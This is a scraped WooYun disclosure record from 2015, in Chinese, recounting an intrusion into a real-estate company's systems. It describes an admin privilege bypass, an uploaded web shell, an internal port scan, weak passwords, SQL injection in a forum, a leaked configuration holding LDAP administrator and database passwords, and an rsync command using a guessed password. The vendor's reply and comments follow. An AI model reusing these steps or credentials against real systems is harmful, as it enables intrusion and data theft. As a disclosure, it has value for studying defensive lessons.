{"id": 10922, "wybug_id": "wooyun-2015-0130575", "wybug_title": "链家地产某业务漏洞导致内网渗透暴露多个安全问题", "wybug_corp": "homelink.com.cn", "wybug_author": "redrain有节操", "wybug_date": "2015-07-31 09:23", "wybug_open_date": "2015-07-31 14:42", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-31：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 富还是你们富，没地方住诶链家某业务逻辑问题可导致普通用户越权admin，任意文件上传后shell进入内网，随后发现其内网脆弱性。。。真的很脆弱，影响所有员工数据，用户数据（诸多北漂屌丝们），影响整个线上业务，猜密码大法好 详细说明：  url:http://119.254.70.121/注册用户后居然能直接进行后台管理。。。\n\n上传没有任何过滤，简单shellhttp://119.254.70.121//upload/video/PIC_0000001180.jsproot权限，确定一下网段\n\n随后探测性扫描一下网段的业务\n172.16.4.15:80 OPEN172.16.4.17:80 OPEN172.16.4.18:80 OPEN172.16.4.20:8080 OPEN172.16.4.14:80 OPEN172.16.4.30:8080 OPEN172.16.4.19:8080 OPEN172.16.4.26:80 OPEN172.16.4.13:80 OPEN172.16.4.11:80 OPEN172.16.4.16:80 OPEN172.16.4.33:80 OPEN172.16.4.22:80 OPEN172.16.4.24:80 OPEN172.16.4.23:80 OPEN172.16.4.30:80 OPEN172.16.4.28:80 OPEN172.16.4.29:80 OPEN172.16.4.25:80 OPEN172.16.4.31:80 OPEN172.16.4.45:8080 OPEN172.16.4.37:8080 OPEN172.16.4.38:80 OPEN172.16.4.47:80 OPEN172.16.4.40:80 OPEN172.16.4.48:80 OPEN172.16.4.49:80 OPEN172.16.4.46:80 OPEN172.16.4.50:80 OPEN172.16.4.54:80 OPEN172.16.4.55:8080 OPEN172.16.4.53:8080 OPEN172.16.4.65:8080 OPEN172.16.4.71:80 OPEN172.16.4.72:80 OPEN172.16.4.77:80 OPEN172.16.4.81:8080 OPEN172.16.4.78:80 OPEN172.16.4.82:80 OPEN172.16.4.86:80 OPEN172.16.4.85:8080 OPEN172.16.4.84:8080 OPEN172.16.4.86:8080 OPEN172.16.4.92:80 OPEN172.16.4.93:80 OPEN172.16.4.93:8080 OPEN172.16.4.95:80 OPEN172.16.4.97:8080 OPEN172.16.4.63:80 OPEN172.16.4.101:80 OPEN172.16.4.103:80 OPEN172.16.4.108:80 OPEN172.16.4.113:80 OPEN172.16.4.115:80 OPEN172.16.4.116:80 OPEN172.16.4.117:80 OPEN172.16.4.118:8080 OPEN172.16.4.120:80 OPEN172.16.4.121:80 OPEN172.16.4.123:80 OPEN172.16.4.124:80 OPEN172.16.4.105:80 OPEN172.16.4.127:80 OPEN172.16.4.129:80 OPEN172.16.4.130:80 OPEN172.16.4.134:80 OPEN172.16.4.136:8080 OPEN172.16.4.138:80 OPEN172.16.4.139:80 OPEN172.16.4.144:80 OPEN172.16.4.145:8080 OPEN172.16.4.149:80 OPEN172.16.4.147:80 OPEN172.16.4.148:8080 OPEN172.16.4.152:80 OPEN172.16.4.153:8080 OPEN172.16.4.150:80 OPEN172.16.4.159:80 OPEN172.16.4.159:8080 OPEN172.16.4.154:80 OPEN172.16.4.155:80 OPEN172.16.4.157:8080 OPEN172.16.4.158:80 OPEN172.16.4.157:80 OPEN172.16.4.160:80 OPEN172.16.4.162:80 OPEN172.16.4.163:80 OPEN172.16.4.165:80 OPEN172.16.4.165:8080 OPEN172.16.4.172:8080 OPEN172.16.4.173:8080 OPEN172.16.4.174:8080 OPEN172.16.4.176:8080 OPEN172.16.4.175:8080 OPEN172.16.4.177:8080 OPEN172.16.4.179:80 OPEN172.16.4.183:80 OPEN172.16.4.186:8080 OPEN172.16.4.185:8080 OPEN172.16.4.190:80 OPEN172.16.4.191:80 OPEN172.16.4.195:80 OPEN172.16.4.193:8080 OPEN172.16.4.194:80 OPEN172.16.4.197:80 OPEN172.16.4.193:80 OPEN172.16.4.199:80 OPEN172.16.4.202:8080 OPEN172.16.4.204:80 OPEN172.16.4.206:80 OPEN172.16.4.210:80 OPEN172.16.4.212:80 OPEN172.16.4.216:80 OPEN172.16.4.218:80 OPEN172.16.4.220:80 OPEN172.16.4.221:80 OPEN172.16.4.219:8080 OPEN172.16.4.222:80 OPEN172.16.4.223:80 OPEN172.16.4.224:80 OPEN172.16.4.225:80 OPEN172.16.4.227:80 OPEN172.16.4.229:80 OPEN172.16.4.228:80 OPEN172.16.4.230:80 OPEN172.16.4.231:80 OPEN172.16.4.230:8080 OPEN172.16.4.233:80 OPEN172.16.4.236:80 OPEN172.16.4.235:80 OPEN172.16.4.238:80 OPEN172.16.4.237:8080 OPEN172.16.4.239:80 OPEN172.16.4.241:80 OPEN172.16.4.242:8080 OPEN172.16.4.243:80 OPEN172.16.4.245:80 OPEN172.16.4.248:80 OPEN172.16.4.250:80 OPEN172.16.4.251:80 OPEN\nhttp://172.16.4.245核心销售平台弱口令，简单看一下，基本销售业务都在眼皮下了\n\n172.16.4.236是内部论坛，discuz7.2存在sqli获取一下表前缀：dvbb_\n\n简单证明一下数据\n\n拿uc_key可getshell，拿member数据可脱员工数据过sso进一步玩其他业务来翻一翻文件，发现好东西\n#Created by JInto - www.guh-software.de#Sun Jun 15 16:00:01 CST 2008driverClassName=oracle.jdbc.driver.OracleDriver# \\u7531\\u4E8E\\u4F7F\\u7528p6spy\\u663E\\u793Aheibernate\\u7684sql\\u53C2\\u6570\\uFF0C\\u56E0\\u6B64\\u66FF\\u6362\\u9A71\\u52A8\\uFF0C\\u5B9E\\u9645\\u9A71\\u52A8\\u5728 spy.properties\\u91CC\\u914D\\u7F6E#driverClassName=com.p6spy.engine.spy.P6SpyDriverurl=jdbc\\:oracle\\:thin\\:@172.16.4.129\\:1521\\:hstudy#url=jdbc\\:oracle\\:thin\\:@localhost\\:1521\\:orclp.minIdle=20password=hstudyp.maxActive=100sqlldrpath=sqlldrusername=hstudyinstance=orcl#ldapldap.url=ldap://172.16.3.12:389/ldap.userDN=cn=administrator,cn=users,dc=corp,dc=homelink,dc=com,dc=cn1ldap.pwd=azAZ123$%^1ldap.baseDN=OU\\=\\u5317\\u4EAC\\u94FE\\u5BB6,DC\\=corp,DC\\=linkhome,DC\\=com,DC\\=cn1\n数据库连接串和ldap认证都拿到了http://172.16.4.30/users/sign_ingitlab可通过ldap认证进入http://passport.homelink.com.cn/cas/login?service=http://sm.lianjia.com/shiro-cashttp://172.16.4.38/login_page.php?return=index.php&error=1&username=admin&perm_login=0&secure_session=1几个敏感业务也可通过员工sso认证后访问有办公段，但考虑到大晚上就没撸员工办公段了接下来就是用户数据了，rsync，密码一猜就中proxychains rsync backuser@172.16.3.112::docfileDB/rmanbackup/password:homelink\n\n   漏洞证明：  \n\n\n\n\n\n\n#Created by JInto - www.guh-software.de#Sun Jun 15 16:00:01 CST 2008driverClassName=oracle.jdbc.driver.OracleDriver# \\u7531\\u4E8E\\u4F7F\\u7528p6spy\\u663E\\u793Aheibernate\\u7684sql\\u53C2\\u6570\\uFF0C\\u56E0\\u6B64\\u66FF\\u6362\\u9A71\\u52A8\\uFF0C\\u5B9E\\u9645\\u9A71\\u52A8\\u5728 spy.properties\\u91CC\\u914D\\u7F6E#driverClassName=com.p6spy.engine.spy.P6SpyDriverurl=jdbc\\:oracle\\:thin\\:@172.16.4.129\\:1521\\:hstudy#url=jdbc\\:oracle\\:thin\\:@localhost\\:1521\\:orclp.minIdle=20password=hstudyp.maxActive=100sqlldrpath=sqlldrusername=hstudyinstance=orcl#ldapldap.url=ldap://172.16.3.12:389/ldap.userDN=cn=administrator,cn=users,dc=corp,dc=homelink,dc=com,dc=cn1ldap.pwd=azAZ123$%^1ldap.baseDN=OU\\=\\u5317\\u4EAC\\u94FE\\u5BB6,DC\\=corp,DC\\=linkhome,DC\\=com,DC\\=cn1\n   修复方案：  自查弱口令尽快修改ldap等关键密码，以防gitlab代码被下后门内网业务及时补丁最后，最重要的一条修复建议：请减免房租造福屌丝   版权声明：转载请注明来源 redrain有节操@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-31 14:42 厂商回复： 谢谢，业务已经下线整改。 最新状态： 2015-07-31：已下线  ", "replys": "漏洞评价：\n评论\n     2015-07-31 13:04 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  鸿宇牛！    \n     2015-07-31 15:44 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:67        | 沉淀。)\t\t \n  洞主你好，扫不同ip的80和8080端口使用什么？nmap吗？    \n     2015-07-31 19:01 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  @默之 nmap有点慢，自己写一个py流量代理进去扫    \n     2015-07-31 20:03 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:67        | 沉淀。)\t\t \n  @redrain有节操 好，谢谢了    \n     2015-07-31 22:03 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  牛笔    \n     2015-08-04 18:05 |    \t\taNsSe \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 独自一人走天下)\t\t \n  已学习    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}